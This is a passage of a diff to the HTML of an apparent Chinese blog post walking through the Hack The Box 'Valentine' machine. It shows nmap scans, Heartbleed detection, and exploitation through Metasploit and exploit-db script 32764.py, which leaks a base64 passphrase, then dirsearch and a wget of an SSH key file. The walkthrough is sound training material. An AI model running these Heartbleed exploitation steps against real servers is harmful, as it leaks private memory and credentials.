@@ -10,7 +10,7 @@
 <meta name="description" content="Xavier&#39;s Blog" /><meta name="keywords" content='HTB, OSCP' /><meta itemprop="name" content="HTB靶机 012 Valentine WriteUp">
 <meta itemprop="description" content=""><meta itemprop="datePublished" content="2023-05-01T19:55:27+08:00" />
 <meta itemprop="dateModified" content="2023-05-01T19:55:27+08:00" />
-<meta itemprop="wordCount" content="2587">
+<meta itemprop="wordCount" content="2848">
 <meta itemprop="keywords" content="HTB,OSCP," /><meta property="og:title" content="HTB靶机 012 Valentine WriteUp" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
@@ -32,7 +32,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/www.bthoughts.top\/posts\/hackthebox-valentine\/"
-    },"genre": "posts","keywords": "HTB, OSCP","wordcount":  2587 ,
+    },"genre": "posts","keywords": "HTB, OSCP","wordcount":  2848 ,
     "url": "https:\/\/www.bthoughts.top\/posts\/hackthebox-valentine\/","datePublished": "2023-05-01T19:55:27+08:00","dateModified": "2023-05-01T19:55:27+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -189,7 +189,7 @@
       </h1></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
           <span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div>
-      <div class="post-meta-line"><span title=2023-05-01&#32;19:55:27><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-05-01">2023-05-01</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 2587 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 6 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span title=2023-05-01&#32;19:55:27><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-05-01">2023-05-01</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 2848 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 6 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -220,7 +220,25 @@
 <p>靶机IP：10.10.10.79</p>
 <h2 id="scan">Scan</h2>
 <p>nmap端口扫描：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ sudo nmap -sSV -T4 10.10.10.79 -F
 </span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-29 00:47 CST
 </span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.79
@@ -234,10 +252,56 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 28.88 seconds
-</span></span></code></pre></div><p>访问80、443端口都是如下一张图片：</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问80、443端口都是如下一张图片：</p>
 <p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429004953743.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004953743.png, resource/012-Valentine.assets/image-20230429004953743.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429004953743.png 2x" sizes="auto" data-title="image-20230429004953743" data-alt="image-20230429004953743" width="2034" height="1222" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>通过图片联想到心脏滴血漏洞，使用nmap进行探测</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ ls /usr/share/nmap/scripts <span class="p">|</span> grep ssl             
 </span></span><span class="line"><span class="cl">rmi-vuln-classloader.nse
 </span></span><span class="line"><span class="cl">ssl-ccs-injection.nse
@@ -277,9 +341,36 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.19 seconds
-</span></span></code></pre></div><p>探测结果说明心脏滴血漏洞存在。</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>探测结果说明心脏滴血漏洞存在。</p>
 <p>之后先针对心脏滴血漏洞进行利用，同时扫描全端口，看看有没有忽略的信息</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ sudo nmap -sSV -T4 10.10.10.79 -p-
 </span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-29 15:24 CST
 </span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.79
@@ -300,11 +391,47 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 1181.61 seconds
-</span></span></code></pre></div><p>使用-sC 对相应端口进行扫描，发现无新增结果，就不写细节了。</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用-sC 对相应端口进行扫描，发现无新增结果，就不写细节了。</p>
 <h2 id="heartbleed">Heartbleed</h2>
 <h3 id="msf">MSF</h3>
 <p>利用MSF进行漏洞利用</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ msfconsole                                                                              
 </span></span><span class="line"><span class="cl">msf6 &gt; search heartbleed
 </span></span><span class="line"><span class="cl">
@@ -334,13 +461,30 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.79:443       - Leaking heartbeat response <span class="c1">#1</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.79:443       - Sending Client Hello...
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.10.79:443       - SSL record <span class="c1">#1:</span>
-</span></span></code></pre></div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429155205097.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155205097.png, resource/012-Valentine.assets/image-20230429155205097.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155205097.png 2x" sizes="auto" data-title="image-20230429155205097" data-alt="image-20230429155205097" width="2278" height="1228" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429155205097.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155205097.png, resource/012-Valentine.assets/image-20230429155205097.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155205097.png 2x" sizes="auto" data-title="image-20230429155205097" data-alt="image-20230429155205097" width="2278" height="1228" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429155239318.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155239318.png, resource/012-Valentine.assets/image-20230429155239318.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155239318.png 2x" sizes="auto" data-title="image-20230429155239318" data-alt="image-20230429155239318" width="2290" height="1230" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429155329208.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155329208.png, resource/012-Valentine.assets/image-20230429155329208.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155329208.png 2x" sizes="auto" data-title="image-20230429155329208" data-alt="image-20230429155329208" width="2286" height="1314" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>心脏滴血是一个信息泄露漏洞，每次泄露的信息并不一样，所以需要多执行几次。</p>
 <h3 id="非msf">非MSF</h3>
 <p>搜索EXP：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ searchsploit heartbleed                                            
 </span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------------------- ---------------------------------
 </span></span><span class="line"><span class="cl"> Exploit Title                                                                                           <span class="p">|</span>  Path
@@ -351,8 +495,33 @@
 </span></span><span class="line"><span class="cl">OpenSSL TLS Heartbeat Extension - <span class="s1">&#39;Heartbleed&#39;</span> Memory Disclosure                                         <span class="p">|</span> multiple/remote/32745.py
 </span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------------------- ---------------------------------
 </span></span><span class="line"><span class="cl">Shellcodes: No Results
-</span></span></code></pre></div><p>找个利用脚本进行利用</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>找个利用脚本进行利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ searchsploit -m multiple/remote/32764.py
 </span></span><span class="line"><span class="cl">  Exploit: OpenSSL 1.0.1f TLS Heartbeat Extension - <span class="s1">&#39;Heartbleed&#39;</span> Memory Disclosure <span class="o">(</span>Multiple SSL/TLS Versions<span class="o">)</span>
 </span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/32764
@@ -371,8 +540,31 @@
 </span></span><span class="line"><span class="cl">Options:
 </span></span><span class="line"><span class="cl">  -h, --help            show this <span class="nb">help</span> message and <span class="nb">exit</span>
 </span></span><span class="line"><span class="cl">  -p PORT, --port<span class="o">=</span>PORT  TCP port to <span class="nb">test</span> <span class="o">(</span>default: 443<span class="o">)</span>
-</span></span></code></pre></div><p>漏洞利用：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>漏洞利用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ python2 32764.py 10.10.10.79
 </span></span><span class="line"><span class="cl">Trying SSL 3.0...
 </span></span><span class="line"><span class="cl">Connecting...
@@ -389,17 +581,47 @@
 </span></span><span class="line"><span class="cl">  0010: BC 2B <span class="m">92</span> A8 <span class="m">48</span> <span class="m">97</span> CF BD <span class="m">39</span> <span class="m">04</span> CC <span class="m">16</span> 0A <span class="m">85</span> <span class="m">03</span> <span class="m">90</span>  .+..H...9.......
 </span></span><span class="line"><span class="cl">  0020: 9F <span class="m">77</span> <span class="m">04</span> <span class="m">33</span> D4 DE <span class="m">00</span> <span class="m">00</span> <span class="m">66</span> C0 <span class="m">14</span> C0 0A C0 <span class="m">22</span> C0  .w.3....f.....<span class="s2">&#34;.
 </span></span></span><span class="line"><span class="cl"><span class="s2">  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
-</span></span></span></code></pre></div><p>同样，因为信息泄露的不确定性，我们需要多执行几次，以发现所期望的敏感信息。</p>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>同样，因为信息泄露的不确定性，我们需要多执行几次，以发现所期望的敏感信息。</p>
 <p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429160817669.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429160817669.png, resource/012-Valentine.assets/image-20230429160817669.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429160817669.png 2x" sizes="auto" data-title="image-20230429160817669" data-alt="image-20230429160817669" width="1448" height="1430" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>执行了多次后，发现泄露了如下信息：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....<span class="nv">$text</span><span class="o">=</span><span class="nv">aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg</span><span class="o">==</span>.
-</span></span></code></pre></div><p>对<code>$text</code>的值<code>aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code>进行base64解密</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....<span class="nv">$text</span><span class="o">=</span><span class="nv">aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg</span><span class="o">==</span>.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对<code>$text</code>的值<code>aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code>进行base64解密</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ <span class="nb">echo</span> <span class="s2">&#34;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&#34;</span> <span class="p">|</span> base64 -d
 </span></span><span class="line"><span class="cl">heartbleedbelievethehype
-</span></span></code></pre></div><h2 id="web扫描">Web扫描</h2>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="web扫描">Web扫描</h2>
 <p>这边decode.php也提示我忘了一个环节：对Web路径的探测，这里补一下</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ dirsearch -e php,html,txt -t <span class="m">100</span> -u https://10.10.10.79/ 
 </span></span><span class="line"><span class="cl">Target: https://10.10.10.79/
 </span></span><span class="line"><span class="cl">
@@ -407,23 +629,82 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>16:15:27<span class="o">]</span> <span class="m">301</span> -  310B  - /dev  -&gt;  https://10.10.10.79/dev/  
 </span></span><span class="line"><span class="cl"><span class="o">[</span>16:15:27<span class="o">]</span> <span class="m">200</span> -    1KB - /dev/
 </span></span><span class="line"><span class="cl"><span class="o">[</span>16:15:39<span class="o">]</span> <span class="m">200</span> -   38B  - /index.php  
-</span></span></code></pre></div><p>访问dev目录如下：</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问dev目录如下：</p>
 <p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429161913176.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429161913176.png, resource/012-Valentine.assets/image-20230429161913176.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429161913176.png 2x" sizes="auto" data-title="image-20230429161913176" data-alt="image-20230429161913176" width="1256" height="692" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>查看notes.txt</p>
-<pre tabindex="0"><code>To do:
-
-1) Coffee.
-2) Research.
-3) Fix decoder/encoder before going live.
-4) Make sure encoding/decoding is only done client-side.
-5) Don&#39;t use the decoder/encoder until any of this is done.
-6) Find a better way to take notes.
-</code></pre><p>查看hype_key：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">To do:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1) Coffee.
+</span></span><span class="line"><span class="cl">2) Research.
+</span></span><span class="line"><span class="cl">3) Fix decoder/encoder before going live.
+</span></span><span class="line"><span class="cl">4) Make sure encoding/decoding is only done client-side.
+</span></span><span class="line"><span class="cl">5) Don&#39;t use the decoder/encoder until any of this is done.
+</span></span><span class="line"><span class="cl">6) Find a better way to take notes.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看hype_key：</p>
 <p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429163925200.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429163925200.png, resource/012-Valentine.assets/image-20230429163925200.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429163925200.png 2x" sizes="auto" data-title="image-20230429163925200" data-alt="image-20230429163925200" width="2304" height="1140" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>下载hype_key</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget https://10.10.10.79/dev/hype_key --no-check-certificate
-</span></span></code></pre></div><p>然后通过xxd 对十六进制进行转换：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
